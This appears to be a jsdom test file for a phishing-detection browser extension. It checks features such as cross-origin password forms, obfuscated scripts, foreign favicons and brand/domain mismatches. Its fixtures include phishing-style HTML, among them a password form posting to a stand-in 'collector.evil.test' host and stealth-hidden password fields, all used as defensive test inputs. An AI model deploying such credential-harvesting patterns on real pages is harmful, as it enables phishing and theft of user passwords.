// Needs jsdom (dev only):  npm i -D jsdom   then   node tests/dom_features.test.js
let JSDOM;
try { ({ JSDOM } = require("jsdom")); } catch { console.log("jsdom not installed - skipping DOM feature tests (npm i -D jsdom)."); process.exit(0); }
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const src = fs.readFileSync(path.join(__dirname, "../content.js"), "utf8");
const schema = JSON.parse(fs.readFileSync(path.join(__dirname, "../data/dom/dom_feature_schema.json"), "utf8"));

function scan(url, html) {
  const w = new JSDOM(html, { url, runScripts: "outside-only", pretendToBeVisual: true }).window;
  w.Element.prototype.getClientRects = function () { // jsdom has no layout engine
    for (let el = this; el && el.nodeType === 1; el = el.parentElement) {
      const cs = w.getComputedStyle(el);
      if (cs.display === "none" || cs.visibility === "hidden") return [];
    }
    return [{}];
  };
  w.chrome = { runtime: { id: "t", sendMessage: () => Promise.resolve(), onMessage: { addListener() {} } } };
  w.eval(src);
  const result = w.__phishGuardScanDom();
  w.close();
  return result;
}
const f = (url, html) => scan(url, html).features;

// 1. schema file matches the extractor exactly (names and order)
const empty = scan("https://example.com/", "<html><body></body></html>");
assert.deepEqual(Object.keys(empty.features), schema.features.map((x) => x.name), "dom_feature_schema.json is out of date - regenerate it");

// 2. privacy: every feature is a plain number, so no page text or input value can leak
for (const v of Object.values(empty.features)) assert.equal(typeof v, "number");
const withText = scan("https://example.com/", `<title>PayPal secret page</title><script>/* my-private-token */ atob("x")</script><input type="password" value="hunter2">`);
assert.ok(!JSON.stringify(withText).includes("hunter2") && !JSON.stringify(withText).includes("my-private-token"));

// 3. existing hand-set scoring is unchanged
assert.deepEqual([...scan("https://f.example.com/", `<form action="https://collector.evil.test/p"><input type="password"></form>`).findings], ["password_form_cross_origin"]);

// 4. new signals
const res = f("https://shop.example.com/login", `<head>
  <link rel="icon" href="https://www.paypalobjects.com/favicon.ico"><meta http-equiv="refresh" content="0; url=https://other.test/x">
  <script src="/app.js"></script><script src="https://cdn.evil.test/a.js"></script><link rel="stylesheet" href="https://shop.example.com/a.css"></head>
  <body><img src="https://img.evil.test/logo.png"><img src="data:image/png;base64,AAAA">
  <a href="#">a</a><a href="javascript:void(0)">b</a><a href="/ok">c</a><a href="https://elsewhere.test/">d</a><a href="mailto:x@y.z">m</a>
  <script>eval(atob("YWxlcnQ=")); document.write(unescape("%41"));</script></body>`);
assert.equal(res.dom_n_resources, 5);                // icon, 2 scripts, stylesheet, 1 http(s) img (data: skipped)
assert.equal(res.dom_n_ext_resources, 3);            // paypalobjects icon, cdn.evil script, img.evil
assert.equal(res.dom_ext_resource_ratio, 0.6);
assert.equal(res.dom_n_ext_scripts, 1);
assert.equal(res.dom_favicon_foreign, 1);
assert.equal(res.dom_meta_refresh, 1);
assert.equal(res.dom_meta_refresh_cross_site, 1);
assert.equal(res.dom_n_links, 4);                    // mailto excluded
assert.equal(res.dom_null_link_ratio, 0.5);
assert.equal(res.dom_ext_link_ratio, 0.25);
assert.equal(res.dom_script_eval, 1);
assert.equal(res.dom_script_atob, 1);
assert.equal(res.dom_script_obfuscation, 1);
assert.equal(res.dom_script_document_write, 1);

// 5. brand vs domain
assert.equal(f("https://secure-login.example.net/", "<title>PayPal - Log in</title>").dom_brand_domain_mismatch, 1);
assert.equal(f("https://www.paypal.com/signin", "<title>PayPal - Log in</title>").dom_brand_domain_mismatch, 0);
assert.equal(f("https://login.live.com/", "<title>Sign in to Microsoft</title>").dom_brand_domain_mismatch, 0);
assert.equal(f("https://hdfcbank.com/", "<title>HDFC Bank NetBanking</title>").dom_brand_domain_mismatch, 0);
assert.equal(f("https://myblog.example.org/", "<title>My pineapple recipes</title>").dom_brand_in_title, 0); // word boundary

// 6. refined password features separate real threats from ordinary UI
const modal = f("https://www.example.com/", `<div style="display:none"><form action="/login"><input type="password"></form></div>`);
assert.equal(modal.dom_n_password_hidden, 1); assert.equal(modal.dom_n_password_stealth_hidden, 0);
const stealth = f("https://x.example.net/", `<form action="/a"><input type="password" style="opacity:0;position:absolute;left:-9999px"></form>`);
assert.equal(stealth.dom_n_password_stealth_hidden, 1);
const sso = f("https://www.example.com/login", `<form action="https://auth.example.com/s"><input type="password"></form>`);
assert.equal(sso.dom_n_password_forms_cross_origin, 1); assert.equal(sso.dom_n_password_forms_cross_site, 0); // sibling subdomain
assert.equal(f("https://app.example.com/", `<form action="javascript:void(0)"><input type="password"></form>`).dom_n_forms_null_action, 1);

// 7. hidden_password_field now fires only on stealth hiding (GitHub-style false alarm fixed)
const finds = (url, html) => [...scan(url, html).findings];
assert.ok(!finds("https://github.com/login", `<form action="/session"><input name="login"><input type="password" name="password"><div style="display:none"><input type="password" name="old"></div></form>`).includes("hidden_password_field"), "closed/inactive password field must not fire");
assert.ok(!finds("https://github.com/login", `<form action="/session"><input type="password"><input type="hidden" name="passkey_response"><input type="hidden" id="webauthn-passkey"></form>`).includes("hidden_password_field"), "hidden input named passkey must not fire");
assert.ok(!finds("https://accounts.google.com/x", `<form action="/p"><input type="password" tabindex="-1" aria-hidden="true" style="opacity:0"></form>`).includes("hidden_password_field"), "aria-hidden decoy must not fire");
assert.ok(finds("https://x.example.net/", `<form action="/a"><input name="u"><input type="password" style="opacity:0;position:absolute;left:-9999px"></form>`).includes("hidden_password_field"), "stealth-hidden password must still fire");

console.log("DOM feature tests passed.");
